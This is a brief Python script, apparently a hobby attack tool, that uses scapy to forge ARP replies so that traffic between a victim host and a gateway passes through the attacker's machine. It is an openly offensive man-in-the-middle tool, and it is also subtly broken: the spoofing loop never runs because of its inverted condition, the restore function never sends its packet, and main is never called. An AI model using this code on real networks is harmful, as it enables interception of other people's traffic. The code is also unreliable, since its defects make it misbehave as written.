import socket
from scapy.all import ARP,Ether,srp,conf,send,arping
import time
from sys import argv
import  getopt

from termcolor import colored

def get_ip():
    hostname = socket.gethostname()
    local_ip = socket.gethostbyname(hostname)
    return local_ip

def get_mac(ip):
  ans, _ = arping(ip)

  for snt,recv in ans:
    mac = recv[Ether].src
    return mac

def arp_spoof(ip_to_spoof, pretend_ip):
  arp_response = ARP()
  arp_response.op = 2 #now it is a response
  arp_response.pdst = ip_to_spoof
  arp_response.psrc = pretend_ip 
  arp_response.hwdst = get_mac(ip_to_spoof)
  arp_response.hwsrc = get_mac(get_ip())

  send(arp_response, verbose = False)

def restore_arp_table(dst, src):
  arp_response = ARP()
  arp_response.op = 2 #now it is a response
  arp_response.pdst = dst
  arp_response.psrc = src 
  arp_response.hwdst = get_mac(dst)
  arp_response.hwsrc = get_mac(src)
def main(mitm, victim_ip,gateway_ip):
  
    c=0
    while c>100:
      arp_spoof(victim_ip,gateway_ip)
      arp_spoof(gateway_ip,victim_ip)
      time.sleep(0.5)
      c=c+1
    restore_arp_table(victim_ip,gateway_ip)
    restore_arp_table(gateway_ip,victim_ip)    

